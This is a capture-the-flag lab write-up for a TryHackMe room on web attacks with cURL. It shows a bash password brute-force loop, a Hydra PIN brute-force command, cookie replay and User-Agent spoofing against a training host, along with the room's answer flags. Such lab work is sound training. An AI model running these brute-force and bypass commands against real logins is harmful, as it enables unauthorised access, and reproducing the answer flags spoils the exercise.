
# Exploitation with cURL - Hoperation Eggsploit

<img width="900" height="900" alt="5f9c7574e201fe31dad228fc-1764173598881" src="https://github.com/user-attachments/assets/b0378835-1e80-4bd2-8b2a-690fcb4a7274" />


https://tryhackme.com/room/webhackingusingcurl-aoc2025-w8q1a4s7d0

---

## Trying out cURL

````shell-session
curl http://10.80.140.77/
````

What happens after running the command is that `curl` sends an `HTTP GET` request for the site's home page. An HTTP response is received containing the body, which is then printed in the terminal. Because this is a terminal, instead of rendering the webpage, what you'll see is the text representation of the page in HTML.

## Sending POST Requests

Suppose you've found a login form whose **POST** target is `/post.php`. When you log in through a browser, it sends a **POST** request to the server containing the credentials you entered. We can simulate this directly from the terminal.

A normal login form submission might look like this:

````shell-session
curl -X POST -d "username=user&password=user" http://10.80.140.77/post.php
````

You should get the reply `Invalid credentials`.

Here's what's happening:

- `-X POST` tells cURL to use the POST method.
- `-d` defines the data we're sending in the body of the request.
- The data will be sent in URL-encoded format, which is the same as what HTML forms use.

If the application expects additional fields, like a "Login" button or a CSRF token, they can be included too:

````shell-session
curl -X POST -d "username=user&password=user&submit=Login" http://10.80.140.77/post.php
````

To view exactly what the server returns (including headers and potential redirects), add the `-i` flag:

````shell-session
curl -i -X POST -d "username=user&password=user" http://10.80.140.77/post.php
````

<img width="846" height="635" alt="ss1" src="https://github.com/user-attachments/assets/7ae1f4a7-ff6a-496d-98d9-4dd41fd87aa0" />


If the site responds with a **Set-Cookie** header, that's a good sign, it means you've successfully logged in or at least triggered a session.

## Using Cookies and Sessions

Once you log in, web applications use cookies to keep your session active. When you make another request with your browser, the cookie gets sent automatically, but with cURL, you need to handle it yourself.

You can do this in two steps:

**Step 1: Save the cookies**

```shell-session
curl -c cookies.txt -d "username=admin&password=admin" http://10.80.140.77/session.php
```

- The `-c` option writes any cookies received from the server into a file (`cookies.txt` in this case).
- You'll often see a session cookie like `PHPSESSID=xyz123`.

<img width="791" height="492" alt="ss2" src="https://github.com/user-attachments/assets/2e5d59ba-dcee-4841-b1e0-643b16b23752" />


**Step 2: Reuse the saved cookies**

```shell-session
curl -b cookies.txt http://10.80.140.77/session.php
```

The `-b` option tells cURL to send the saved cookies in the next request, just like a browser would.

This is exactly how session replay testing works, by replaying valid cookies in separate requests.

## Automating Login and Performing Brute Force Using cURL

Now that we can send POST requests and manage sessions, it's time to automate things. Let's simulate a brute-force attack against a weak login form.

Start by creating a file called `passwords.txt` and place the following passwords inside it:

```text
admin123
password
letmein
secretpass
secret
```

<img width="853" height="470" alt="ss3" src="https://github.com/user-attachments/assets/6206d3e4-980d-43d8-b298-c17e2aa721cc" />


Then, create a simple bash loop called `loop.sh` to try each password against `bruteforce.php` and copy-paste the following code inside it:

```bash
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://10.80.140.77/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
```

Then add the execute permission to the script and run it, as shown below:

```shell-session
chmod +x loop.sh
```

```shell-session
./loop.sh
```

<img width="922" height="341" alt="ss4" src="https://github.com/user-attachments/assets/32e5d308-6b7d-444b-ba01-197ec6434ef8" />


Here's how this works:

- `$(cat passwords.txt)` reads each password from the file.
- `curl -s` sends the login request silently (no progress meter).
- The response is stored in a variable.
- `grep -q` checks if the response contains a success string (like “Welcome”).
- When found, it prints the working password and exits the loop.

This exact method underpins tools like **Hydra**, **Burp Intruder**, and **WFuzz**. By doing it manually, you understand what's happening under the hood: a repetitive HTTP POST with variable data, waiting for a different response.

<img width="813" height="167" alt="ss5" src="https://github.com/user-attachments/assets/00cd90cd-e2dd-4a7e-a002-f9b534997640" />


*The password found is secretpass*

## Bypassing User-Agent Checks

Some applications block cURL by checking the **User-Agent** header. For example, the server may reject requests with: `User-Agent: curl/7.x.x`

To specify a custom user-agent, we can use the `-A` flag:

```shell-session
curl -A "internalcomputer" http://10.80.140.77/ua_check.php
```

To confirm:

```shell-session
curl -i http://10.80.140.77/ua_check.php
```

```shell-session
curl -i -A "internalcomputer" http://10.80.140.77/ua_check.php
```

If the first fails and the second succeeds, the UA check is working, and you've bypassed it by spoofing.

<img width="972" height="548" alt="ss6" src="https://github.com/user-attachments/assets/7a111ad2-95c2-4308-908e-00fc829b4df9" />


---

Q: Make a **POST** request to the `/post.php` endpoint with the **username** `admin` and the **password** `admin`. What is the flag you receive?

```bash
url -X POST -d "username=admin&password=admin&submit=Login" http://10.80.140.77/post.php
```

SS7
<img width="906" height="126" alt="ss7" src="https://github.com/user-attachments/assets/f1869824-7a76-40a2-9308-9c217f82a000" />

A: THM{curl_post_success}


Q: Make a request to the `/cookie.php` endpoint with the **username** `admin` and the **password** `admin` and save the cookie. Reuse that saved cookie at the same endpoint. What is the flag your receive?

save the cookies:
```bash
curl -c cookies.txt -d "username=admin&password=admin" http://10.80.140.77/cookie.php
```

```text
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

10.80.140.77	FALSE	/	FALSE	0	PHPSESSID	29d4mtkum7pb3a5r3egbto2rmn
```

reuse the cookies:
```bash
curl -b cookies.txt http://10.80.140.77/cookie.php
```

SS8
<img width="901" height="388" alt="ss8" src="https://github.com/user-attachments/assets/527009f8-d0f7-43b6-a43c-b159cfb22710" />


A: THM{session_cookie_master}


Q: After doing the brute force on the `/bruteforce.php` endpoint, what is the password of the `admin` user?

A: secretpass


Q: Make a request to the `/agent.php` endpoint with the user-agent `TBFC`. What is the flag your receive?

```bash
curl -A "TBFC" http://10.80.140.77/agent.php
```

SS9
<img width="707" height="76" alt="ss9" src="https://github.com/user-attachments/assets/ff3dc558-3108-4713-bbc0-9dcb116fa2ad" />

A: THM{user_agent_filter_bypassed}


---

## Bonus Mission

**This section is optional and applies only to the final bonus question. The instructions in this section do not apply to the regular questions. Feel free to skip it and proceed with the regular questions if you don’t intend to attempt it.**

Before the final battle can begin, the wormhole must be closed to stop enemy reinforcements. The evil Easter bunnies operate a web control panel that holds it open. The blue team must identify endpoints, authenticate and obtain the operator token, and call the close operation.

**Hint:** Use rockyou.txt when brute forcing for the password (only for the bonus mission). The PIN is between 4000 and 5000.

**Server**: `http://10.80.140.77/terminal.php?action=panel`


Solution:

```bash
seq 4000 5000 > pins.txt

```


```bash
hydra -l admin -P pins.txt 10.80.140.77 http-post-form \
"/terminal.php?action=panel:username=^USER^&password=FOUND_PASSWORD&pin=^PASS^:F=Invalid PIN" \
-t 32 -f

```

```text
host: 10.80.140.77   login: admin   password: 4012
```

SS10
<img width="987" height="200" alt="ss10" src="https://github.com/user-attachments/assets/e6c0465e-8c6e-4b3b-966d-91512daeeec0" />
